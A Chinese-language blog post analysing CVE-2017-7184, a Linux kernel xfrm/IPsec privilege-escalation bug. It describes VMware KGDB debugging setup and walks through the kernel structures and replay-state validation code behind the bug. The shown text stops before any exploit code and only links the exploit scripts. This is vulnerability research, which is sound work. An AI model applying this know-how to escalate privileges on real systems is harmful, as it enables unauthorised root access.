<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>漏洞来源于长亭安全研究实验室在2017年PWN2OWN大赛中Ubuntu 16.10 Desktop的本地提权漏洞，本分析是该漏洞利用的一种直接越界写cred结构体进而提权的方法，后续可能会分析长亭文档中提及的劫持控制流的方法。</p>
<p>本次漏洞分析基于<code>Linux 4.4.0-21-generic</code>版本，即<code>Ubuntu 16.04.1</code>。镜像可从<a href="http://old-releases.ubuntu.com/releases/16.04.1/ubuntu-16.04-desktop-amd64.iso" target="_blank">此处</a>下载，文中涉及的脚本可从<a href="https://github.com/ret2p4nda/kernel-pwn/blob/master/CVE-2017-7184" target="_blank">此处</a>下载。</p>
<p>本篇文章被同步于<a href="http://p4nda.top/2019/02/16/CVE-2017-7184/" target="_blank">我的blog</a>上，内容如有差错，望指出orz。</p>
<h1 data-content="1" id="1f3996ec50895ee3541d4226c2ab0bc6">双机调试环境搭建</h1>
<p>本次分析没有采用<code>QEMU</code>，而是用了<code>VMware</code>来进行双机调试，给我个人的感觉就是很慢，而且符号表不全很多函数都被编译优化掉了。调试环境构建参考了<a href="https://bbs.pediy.com/thread-249192.htm" target="_blank">《ubuntu 内核源码调试方法（双机调试》</a>，由于我已经有了一个调试虚拟机（debugging），所以仅需利用上述镜像构建被调试机（debuggee）。</p>
<h2 data-content="1" id="e2e447644148103b62bd651e5ab5e317">debugging环境配置</h2>
<p>由于主要的调试时在<code>debugging</code>上完成的，所以大部分的程序包都需要安装在debugging上。</p>
<p><strong>dbsym安装</strong></p>
<p>这个就是带有符号表的vmlinux文件，需要根据debuggee来确定。</p>
<p>如在<code>debuggee</code>上利用<code>uname -sr</code>命令得到的结果是<code>Linux 4.4.0-21-generic</code>，则需要下载安装<code>vmlinux-4.4.0-21-generic</code>。</p>
<p>首先需要更新源文件，执行命令如下：</p>
<div class="highlight"><pre><span></span><span class="c1"># 增加source.list</span>
<span class="nv">codename</span><span class="o">=</span><span class="k">$(</span>lsb_release -c <span class="p">|</span> awk <span class="s1">'{print $2}'</span><span class="k">)</span>
sudo tee /etc/apt/sources.list.d/ddebs.list <span class="s">&lt;&lt; EOF</span>
<span class="s">deb http://ddebs.ubuntu.com/ ${codename} main restricted universe multiverse</span>
<span class="s">deb http://ddebs.ubuntu.com/ ${codename}-security main restricted universe multiverse</span>
<span class="s">deb http://ddebs.ubuntu.com/ ${codename}-updates main restricted universe multiverse</span>
<span class="s">deb http://ddebs.ubuntu.com/ ${codename}-proposed main restricted universe multiverse</span>
<span class="s">EOF</span>
<span class="c1"># 添加访问符号服务器的秘钥文件</span>
wget -O - http://ddebs.ubuntu.com/dbgsym-release-key.asc <span class="p">|</span> sudo apt-key add -
<span class="c1"># 更新源文件</span>
sudo apt-get update
</pre></div>
<p>然后利用apt-get下载这个文件：</p>
<div class="highlight"><pre><span></span>sudo apt-get install linux-image-4.4.0-21-generic-dbgsym
</pre></div>
<p>然后进入漫长的等待，最终在<code>/usr/lib/debug/boot/vmlinux-4.4.0-21-generic</code>这里可以找到。</p>
<p><strong>源码下载与配置</strong></p>
<p>我采用了比较粗暴的方法，直接下载<code>linux 4.4.0</code>版本的源码，命令如下：</p>
<div class="highlight"><pre><span></span><span class="c1"># 启用deb-src</span>
deb-src http://cn.archive.ubuntu.com/ubuntu/ xenial main restricted
<span class="c1">#搜索源码：</span>
apt-cache search linux-source
<span class="c1">#安装指定版本的源码：</span>
sudo apt-get install linux-source-4.4.0
</pre></div>
<p>默认下载的源码会放在<code>/usr/src/linux-source-4.4.0/linux-source-4.4.0.tar.bz2</code>。并将其解压到<code>/build/linux-Ay7j_C/linux-4.4.0</code>目录下就可以在调试的时候看到源码。原因是调试符号中包含的路径是编译时的硬编码路径，因此其他Ubuntu版本在调试时可找到这个硬编码路径，将源码解压到此处即可。</p>
<p><strong>设置通信串口</strong></p>
<p>需要为<code>debugging</code>添加通信的串口，其调试原理是两虚拟机通过物理实体机的串口进行通信，远程调试。</p>
<p>对<code>debugging</code>的设置如下，命名管道如果<strong>物理机</strong>是<code>Windows</code>系统，则为<code>//./pipe/com_1</code>。<code>Linux</code>系统为<code>/tmp/serial</code>。由于存在打印机设备可能占用<code>/dev/ttyS0设备</code>，因此在<code>debugging</code>和<code>debuggee</code>中，我均删除了这个硬件。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190217133735-2130fe76-3276-1.jpg"/></p>
<p><strong>编写调试脚本</strong></p>
<p>调试脚本即<code>gdb</code>所执行的命令，用于远程调试<code>debuggee</code>。此脚本需要<code>sudo</code>执行。</p>
<div class="highlight"><pre><span></span>gdb <span class="se">\</span>
    -ex <span class="s2">"add-auto-load-safe-path </span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span><span class="s2">"</span> <span class="se">\</span>
    -ex <span class="s2">"file /usr/lib/debug/boot/vmlinux-4.4.0-21-generic"</span> <span class="se">\</span>
    -ex <span class="s1">'set arch i386:x86-64:intel'</span> <span class="se">\</span>
    -ex <span class="s1">'target remote /dev/ttyS0'</span> <span class="se">\</span>
    -ex <span class="s1">'continue'</span> <span class="se">\</span>
    -ex <span class="s1">'disconnect'</span> <span class="se">\</span>
    -ex <span class="s1">'set arch i386:x86-64'</span> <span class="se">\</span>
    -ex <span class="s1">'target remote /dev/ttyS0'</span>
</pre></div>
<h2 data-content="1" id="c5742072121cabcf7c2e673515b12af5">debuggee环境配置</h2>
<p><strong>启动项设置</strong></p>
<p>首先需要在为待调试的内核设置一个新的启动项，使其开机时进入调试模式，等待链接。</p>
<p>具体操作是编辑<code>/etc/grub.d/40_custom</code>，在其中加入</p>
<div class="highlight"><pre><span></span><span class="ch">#!/bin/sh</span>
<span class="nb">exec</span> tail -n +3 <span class="nv">$0</span>
<span class="c1"># This file provides an easy way to add custom menu entries.  Simply type the</span>
<span class="c1"># menu entries you want to add after this comment.  Be careful not to change</span>
<span class="c1"># the 'exec tail' line above.</span>
menuentry <span class="s1">'Ubuntu, KGDB with nokaslr'</span> --class ubuntu --class gnu-linux --class gnu --class os <span class="nv">$menuentry_id_option</span> <span class="s1">'gnulinux-simple-b5907b23-09bb-4b75-bd51-eb04048e56d8'</span> <span class="o">{</span>
    recordfail
    load_video
    gfxmode <span class="nv">$linux_gfx_mode</span>
    insmod gzio
    <span class="k">if</span> <span class="o">[</span> x<span class="nv">$grub_platform</span> <span class="o">=</span> xxen <span class="o">]</span><span class="p">;</span> <span class="k">then</span> insmod xzio<span class="p">;</span> insmod lzopio<span class="p">;</span> <span class="k">fi</span>
    insmod part_msdos
    insmod ext2
    <span class="nb">set</span> <span class="nv">root</span><span class="o">=</span><span class="s1">'hd0,msdos1'</span>
    <span class="k">if</span> <span class="o">[</span> x<span class="nv">$feature_platform_search_hint</span> <span class="o">=</span> xy <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
      search --no-floppy --fs-uuid --set<span class="o">=</span>root --hint-bios<span class="o">=</span>hd0,msdos1 --hint-efi<span class="o">=</span>hd0,msdos1 --hint-baremetal<span class="o">=</span>ahci0,msdos1  b5907b23-09bb-4b75-bd51-eb04048e56d8
    <span class="k">else</span>
      search --no-floppy --fs-uuid --set<span class="o">=</span>root b5907b23-09bb-4b75-bd51-eb04048e56d8
    <span class="k">fi</span>
    <span class="nb">echo</span> <span class="s1">'Loading Linux 4.10.0-19 with KGDB built by GEDU lab...'</span>   
    linux   /boot/vmlinuz-4.4.0-21-generic <span class="nv">root</span><span class="o">=</span><span class="nv">UUID</span><span class="o">=</span>b5907b23-09bb-4b75-bd51-eb04048e56d8 ro <span class="nv">find_preseed</span><span class="o">=</span>/preseed.cfg auto noprompt <span class="nv">priority</span><span class="o">=</span>critical <span class="nv">locale</span><span class="o">=</span>en_US quiet kgdbwait <span class="nv">kgdb8250</span><span class="o">=</span>io,03f8,ttyS0,115200,4 <span class="nv">kgdboc</span><span class="o">=</span>ttyS0,115200 kgdbcon nokaslr
    <span class="nb">echo</span> <span class="s1">'Loading initial ramdisk ...'</span>  
    initrd  /boot/initrd.img-4.4.0-21-generic
</pre></div>
<p>其中参数可参考<code>/boot/grub/grub.cfg</code>文件，修改完成后执行<code>sudo update-grub</code>命令。</p>
<p><strong>设置通信串口</strong></p>
<p><code>debuggee</code>通信串口的设置与 <code>debugging</code>设置类似，区别仅在于<code>debugging</code>是服务器，<code>debuggee</code>是客户机。</p>
<hr/>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190217133736-2170ea04-3276-1.jpg"/></p>
<h2 data-content="1" id="0fef90d5b7e3550fe5a5eb24a0859d70">进入调试</h2>
<p>在<code>debugging</code>启动时，按住<code>shift</code>，出现如下界面，选择<code>KGDB with nokaslr</code>。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190217133736-2195d648-3276-1.jpg"/></p>
<p>系统进入远程调试等待。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190217133736-21ca5846-3276-1.jpg"/></p>
<p>此时，在<code>debugging</code>中执行<code>sudo ./gdb_kernel</code>，就可以远程调试了。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190217133737-220aa9e6-3276-1.jpg"/></p>
<h1 data-content="1" id="889067b0aec8d7feff3261eda39afa4a">漏洞分析</h1>
<p>漏洞位于内核<code>xfrm</code>模块，该模块是<code>IPSEC</code>协议的实现模块。其中<code>xfrm_state</code>结构体用于表示一个<code>SA(Security Associstion)</code>，<code>AH</code>及<code>ESP</code>协议数据包可通过<code>SA</code>进行检查，其数据结构如下：</p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">xfrm_state</span> <span class="p">{</span>
    <span class="n">possible_net_t</span>      <span class="n">xs_net</span><span class="p">;</span>
    <span class="k">union</span> <span class="p">{</span>
        <span class="k">struct</span> <span class="n">hlist_node</span>   <span class="n">gclist</span><span class="p">;</span>
        <span class="k">struct</span> <span class="n">hlist_node</span>   <span class="n">bydst</span><span class="p">;</span>
    <span class="p">};</span>
    <span class="k">struct</span> <span class="n">hlist_node</span>   <span class="n">bysrc</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">hlist_node</span>   <span class="n">byspi</span><span class="p">;</span>

    <span class="n">atomic_t</span>        <span class="n">refcnt</span><span class="p">;</span>
    <span class="n">spinlock_t</span>      <span class="n">lock</span><span class="p">;</span>

    <span class="k">struct</span> <span class="n">xfrm_id</span>      <span class="n">id</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_selector</span>    <span class="n">sel</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_mark</span>    <span class="n">mark</span><span class="p">;</span>
    <span class="n">u32</span>         <span class="n">tfcpad</span><span class="p">;</span>

    <span class="n">u32</span>         <span class="n">genid</span><span class="p">;</span>

    <span class="cm">/* Key manager bits */</span>
    <span class="k">struct</span> <span class="n">xfrm_state_walk</span>  <span class="n">km</span><span class="p">;</span>

    <span class="cm">/* Parameters of this state. */</span>
    <span class="k">struct</span> <span class="p">{</span>
        <span class="n">u32</span>     <span class="n">reqid</span><span class="p">;</span>
        <span class="n">u8</span>      <span class="n">mode</span><span class="p">;</span>
        <span class="n">u8</span>      <span class="n">replay_window</span><span class="p">;</span>
        <span class="n">u8</span>      <span class="n">aalgo</span><span class="p">,</span> <span class="n">ealgo</span><span class="p">,</span> <span class="n">calgo</span><span class="p">;</span>
        <span class="n">u8</span>      <span class="n">flags</span><span class="p">;</span>
        <span class="n">u16</span>     <span class="n">family</span><span class="p">;</span>
        <span class="n">xfrm_address_t</span>  <span class="n">saddr</span><span class="p">;</span>
        <span class="kt">int</span>     <span class="n">header_len</span><span class="p">;</span>
        <span class="kt">int</span>     <span class="n">trailer_len</span><span class="p">;</span>
        <span class="n">u32</span>     <span class="n">extra_flags</span><span class="p">;</span>
    <span class="p">}</span> <span class="n">props</span><span class="p">;</span>

    <span class="k">struct</span> <span class="n">xfrm_lifetime_cfg</span> <span class="n">lft</span><span class="p">;</span>

    <span class="cm">/* Data for transformer */</span>
    <span class="k">struct</span> <span class="n">xfrm_algo_auth</span>   <span class="o">*</span><span class="n">aalg</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_algo</span>    <span class="o">*</span><span class="n">ealg</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_algo</span>    <span class="o">*</span><span class="n">calg</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_algo_aead</span>   <span class="o">*</span><span class="n">aead</span><span class="p">;</span>
    <span class="k">const</span> <span class="kt">char</span>      <span class="o">*</span><span class="n">geniv</span><span class="p">;</span>

    <span class="cm">/* Data for encapsulator */</span>
    <span class="k">struct</span> <span class="n">xfrm_encap_tmpl</span>  <span class="o">*</span><span class="n">encap</span><span class="p">;</span>

    <span class="cm">/* Data for care-of address */</span>
    <span class="n">xfrm_address_t</span>  <span class="o">*</span><span class="n">coaddr</span><span class="p">;</span>

    <span class="cm">/* IPComp needs an IPIP tunnel for handling uncompressed packets */</span>
    <span class="k">struct</span> <span class="n">xfrm_state</span>   <span class="o">*</span><span class="n">tunnel</span><span class="p">;</span>

    <span class="cm">/* If a tunnel, number of users + 1 */</span>
    <span class="n">atomic_t</span>        <span class="n">tunnel_users</span><span class="p">;</span>

    <span class="cm">/* State for replay detection */</span>
    <span class="k">struct</span> <span class="n">xfrm_replay_state</span> <span class="n">replay</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_replay_state_esn</span> <span class="o">*</span><span class="n">replay_esn</span><span class="p">;</span>

    <span class="cm">/* Replay detection state at the time we sent the last notification */</span>
    <span class="k">struct</span> <span class="n">xfrm_replay_state</span> <span class="n">preplay</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_replay_state_esn</span> <span class="o">*</span><span class="n">preplay_esn</span><span class="p">;</span>

    <span class="cm">/* The functions for replay detection. */</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">xfrm_replay</span> <span class="o">*</span><span class="n">repl</span><span class="p">;</span>

    <span class="cm">/* internal flag that only holds state for delayed aevent at the</span>
<span class="cm">     * moment</span>
<span class="cm">    */</span>
    <span class="n">u32</span>         <span class="n">xflags</span><span class="p">;</span>

    <span class="cm">/* Replay detection notification settings */</span>
    <span class="n">u32</span>         <span class="n">replay_maxage</span><span class="p">;</span>
    <span class="n">u32</span>         <span class="n">replay_maxdiff</span><span class="p">;</span>

    <span class="cm">/* Replay detection notification timer */</span>
    <span class="k">struct</span> <span class="n">timer_list</span>   <span class="n">rtimer</span><span class="p">;</span>

    <span class="cm">/* Statistics */</span>
    <span class="k">struct</span> <span class="n">xfrm_stats</span>   <span class="n">stats</span><span class="p">;</span>

    <span class="k">struct</span> <span class="n">xfrm_lifetime_cur</span> <span class="n">curlft</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">tasklet_hrtimer</span>  <span class="n">mtimer</span><span class="p">;</span>

    <span class="cm">/* used to fix curlft-&gt;add_time when changing date */</span>
    <span class="kt">long</span>        <span class="n">saved_tmo</span><span class="p">;</span>

    <span class="cm">/* Last used time */</span>
    <span class="kt">unsigned</span> <span class="kt">long</span>       <span class="n">lastused</span><span class="p">;</span>

    <span class="cm">/* Reference to data common to all the instances of this</span>
<span class="cm">     * transformer. */</span>
    <span class="k">const</span> <span class="k">struct</span> <span class="n">xfrm_type</span>  <span class="o">*</span><span class="n">type</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_mode</span>    <span class="o">*</span><span class="n">inner_mode</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_mode</span>    <span class="o">*</span><span class="n">inner_mode_iaf</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">xfrm_mode</span>    <span class="o">*</span><span class="n">outer_mode</span><span class="p">;</span>

    <span class="cm">/* Security context */</span>
    <span class="k">struct</span> <span class="n">xfrm_sec_ctx</span> <span class="o">*</span><span class="n">security</span><span class="p">;</span>

    <span class="cm">/* Private data of this transformer, format is opaque,</span>
<span class="cm">     * interpreted by xfrm_type methods. */</span>
    <span class="kt">void</span>            <span class="o">*</span><span class="n">data</span><span class="p">;</span>
<span class="p">};</span>
</pre></div>
<p>其中，<code>struct xfrm_id id;</code>用于标识一个<code>SA</code>身份，包含<code>daddr、spi、proto</code>三个参数。</p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">xfrm_id</span> <span class="p">{</span>
    <span class="n">xfrm_address_t</span>  <span class="n">daddr</span><span class="p">;</span>
    <span class="n">__be32</span>      <span class="n">spi</span><span class="p">;</span>
    <span class="n">__u8</span>        <span class="n">proto</span><span class="p">;</span>
<span class="p">};</span>
</pre></div>
<p>此外，<code>SA</code>还包括一个<code>xfrm_replay_state_esn</code>结构体，该结构体定义如下。其中bmp是一个边长的内存区域，是一块<code>bitmap</code>，用于标识数据包的<code>seq</code>是否被重放过，其中<code>bmp_len</code>表示变长结构体的大小，replay_window用于<code>seq</code>索引的模数，即索引的范围，此结构体在创建<code>xfrm_state</code>结构体时根据用户输入参数动态被创建，而程序漏洞存在于这个结构体的读写过程中。</p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">xfrm_replay_state_esn</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">int</span>    <span class="n">bmp_len</span><span class="p">;</span>
    <span class="n">__u32</span>       <span class="n">oseq</span><span class="p">;</span>
    <span class="n">__u32</span>       <span class="n">seq</span><span class="p">;</span>
    <span class="n">__u32</span>       <span class="n">oseq_hi</span><span class="p">;</span>
    <span class="n">__u32</span>       <span class="n">seq_hi</span><span class="p">;</span>
    <span class="n">__u32</span>       <span class="n">replay_window</span><span class="p">;</span>
    <span class="n">__u32</span>       <span class="n">bmp</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">};</span>
</pre></div>
<h2 data-content="1" id="7cb9dfb2d10de2fc1c8cd28a4a94505f">xfrm_state结构体生成</h2>
<p>该结构体生成位于<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L616" target="_blank">xfrm_add_sa</a>函数中，在[1]处对用户输入数据进行参数及协议检查，在[2]处对根据用户输入对结构体进行构造，并放入SA结构体的哈希链表中</p>
<pre><code>static int xfrm_add_sa(struct sk_buff *skb, struct nlmsghdr *nlh,
        struct nlattr **attrs)
{
    struct net *net = sock_net(skb-&gt;sk);
    struct xfrm_usersa_info *p = nlmsg_data(nlh);
    struct xfrm_state *x;
    int err;
    struct km_event c;

[1] err = verify_newsa_info(p, attrs); //协议及参数检查
    if (err)
        return err;

[2] x = xfrm_state_construct(net, p, attrs, &amp;err);
    if (!x)
        return err;

    xfrm_state_hold(x);
    if (nlh-&gt;nlmsg_type == XFRM_MSG_NEWSA)
        err = xfrm_state_add(x);
    else
        err = xfrm_state_update(x);

    xfrm_audit_state_add(x, err ? 0 : 1, true);

    if (err &lt; 0) {
        x-&gt;km.state = XFRM_STATE_DEAD;
        __xfrm_state_put(x);
        goto out;
    }

    c.seq = nlh-&gt;nlmsg_seq;
    c.portid = nlh-&gt;nlmsg_pid;
    c.event = nlh-&gt;nlmsg_type;

    km_state_notify(x, &amp;c);
out:
    xfrm_state_put(x);
    return err;
}</code></pre>
<p>在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L151" target="_blank">verify_newsa_info</a>函数中，首先根据<code>id.proto</code>协议对用户输入的非兼容性参数进行检查，并对各输入参数中的长度合理性进行检查，我们只关心在[1]处的<code>XFRMA_REPLAY_ESN_VAL</code>数据检查。</p>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">verify_newsa_info</span><span class="p">(</span><span class="k">struct</span> <span class="n">xfrm_usersa_info</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span>
                 <span class="k">struct</span> <span class="n">nlattr</span> <span class="o">**</span><span class="n">attrs</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">err</span><span class="p">;</span>

    <span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">family</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="nl">AF_INET</span><span class="p">:</span> <span class="c1">//IPv4</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="k">case</span> <span class="nl">AF_INET6</span><span class="p">:</span> <span class="c1">//IPv6</span>
<span class="cp">#if IS_ENABLED(CONFIG_IPV6)</span>
        <span class="k">break</span><span class="p">;</span>
<span class="cp">#else</span>
        <span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="n">EAFNOSUPPORT</span><span class="p">;</span>
        <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
<span class="cp">#endif</span>

    <span class="k">default</span><span class="o">:</span>
        <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">.</span><span class="n">proto</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="nl">IPPROTO_AH</span><span class="p">:</span>
<span class="p">......</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="k">case</span> <span class="nl">IPPROTO_ESP</span><span class="p">:</span>
<span class="p">......</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="k">case</span> <span class="nl">IPPROTO_COMP</span><span class="p">:</span>
<span class="p">......</span>
        <span class="k">break</span><span class="p">;</span>

<span class="cp">#if IS_ENABLED(CONFIG_IPV6)</span>
    <span class="k">case</span> <span class="nl">IPPROTO_DSTOPTS</span><span class="p">:</span>
    <span class="k">case</span> <span class="nl">IPPROTO_ROUTING</span><span class="p">:</span>
<span class="p">......</span>
        <span class="k">break</span><span class="p">;</span>
<span class="cp">#endif</span>

    <span class="k">default</span><span class="o">:</span>
        <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">verify_aead</span><span class="p">(</span><span class="n">attrs</span><span class="p">)))</span> <span class="c1">//XFRMA_ALG_AEAD参数长度检查</span>
        <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">verify_auth_trunc</span><span class="p">(</span><span class="n">attrs</span><span class="p">)))</span><span class="c1">//XFRMA_ALG_AUTH_TRUNC参数长度检查</span>
        <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">verify_one_alg</span><span class="p">(</span><span class="n">attrs</span><span class="p">,</span> <span class="n">XFRMA_ALG_AUTH</span><span class="p">)))</span><span class="c1">//XFRMA_ALG_AUTH参数长度检查</span>
        <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">verify_one_alg</span><span class="p">(</span><span class="n">attrs</span><span class="p">,</span> <span class="n">XFRMA_ALG_CRYPT</span><span class="p">)))</span><span class="c1">//XFRMA_ALG_CRYPT参数长度检查</span>
        <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">verify_one_alg</span><span class="p">(</span><span class="n">attrs</span><span class="p">,</span> <span class="n">XFRMA_ALG_COMP</span><span class="p">)))</span><span class="c1">//XFRMA_ALG_COMP参数长度检查</span>
        <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">verify_sec_ctx_len</span><span class="p">(</span><span class="n">attrs</span><span class="p">)))</span><span class="c1">//XFRMA_SEC_CTX数据长度定义检查</span>
        <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
<span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="p">((</span><span class="n">err</span> <span class="o">=</span> <span class="n">verify_replay</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">attrs</span><span class="p">)))</span><span class="c1">//XFRMA_REPLAY_ESN_VAL数据检查</span>
        <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>

    <span class="n">err</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
    <span class="k">switch</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">mode</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="nl">XFRM_MODE_TRANSPORT</span><span class="p">:</span>
    <span class="k">case</span> <span class="nl">XFRM_MODE_TUNNEL</span><span class="p">:</span>
    <span class="k">case</span> <span class="nl">XFRM_MODE_ROUTEOPTIMIZATION</span><span class="p">:</span>
    <span class="k">case</span> <span class="nl">XFRM_MODE_BEET</span><span class="p">:</span>
        <span class="k">break</span><span class="p">;</span>

    <span class="k">default</span><span class="o">:</span>
        <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">err</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

<span class="nl">out</span><span class="p">:</span>
    <span class="k">return</span> <span class="n">err</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>在<a href="https://elixir.bootlin.com/linux/v4.10.6/source/net/xfrm/xfrm_user.c#L103" target="_blank">verify_replay</a>函数中，可以看到检查主要有如下几条：[1]<code>bmp_len</code>是否超过最大值，最大值定义为<code>4096/4/8</code>。[2]检查参数长度定义是否正确。[3]是否为<code>IPPROTO_ESP</code>或者<code>IPPROTO_AH</code>协议。</p>
<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kr">inline</span> <span class="kt">int</span> <span class="nf">verify_replay</span><span class="p">(</span><span class="k">struct</span> <span class="n">xfrm_usersa_info</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span>
                <span class="k">struct</span> <span class="n">nlattr</span> <span class="o">**</span><span class="n">attrs</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">struct</span> <span class="n">nlattr</span> <span class="o">*</span><span class="n">rt</span> <span class="o">=</span> <span class="n">attrs</span><span class="p">[</span><span class="n">XFRMA_REPLAY_ESN_VAL</span><span class="p">];</span>
    <span class="k">struct</span> <span class="n">xfrm_replay_state_esn</span> <span class="o">*</span><span class="n">rs</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">XFRM_STATE_ESN</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">rt</span><span class="p">)</span>
            <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>

        <span class="n">rs</span> <span class="o">=</span> <span class="n">nla_data</span><span class="p">(</span><span class="n">rt</span><span class="p">);</span>

<span class="p">[</span><span class="mi">1</span><span class="p">]</span>     <span class="k">if</span> <span class="p">(</span><span class="n">rs</span><span class="o">-&gt;</span><span class="n">bmp_len</span> <span class="o">&gt;</span> <span class="n">XFRMA_REPLAY_ESN_MAX</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">rs</span><span class="o">-&gt;</span><span class="n">bmp</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">/</span> <span class="mi">8</span><span class="p">)</span><span class="c1">// (4096/4/8)</span>
            <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>

<span class="p">[</span><span class="mi">2</span><span class="p">]</span>     <span class="k">if</span> <span class="p">(</span><span class="n">nla_len</span><span class="p">(</span><span class="n">rt</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">xfrm_replay_state_esn_len</span><span class="p">(</span><span class="n">rs</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
            <span class="n">nla_len</span><span class="p">(</span><span class="n">rt</span><span class="p">)</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">rs</span><span class="p">))</span> <span class="c1">//bmp[0]=NULL 或 bmp+head &lt; nla_len</span>
            <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">rt</span><span class="p">)</span>
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

    <span class="cm">/* As only ESP and AH support ESN feature. */</span>
<span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="k">if</span> <span class="p">((</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">.</span><span class="n">proto</span> <span class="o">!=</span> <span class="n">IPPROTO_ESP</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">.</span><span class="n">proto</span> <span class="o">!=</span> <span class="n">IPPROTO_AH</span><span class="p">))</span>
        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">replay_window</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> 
        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
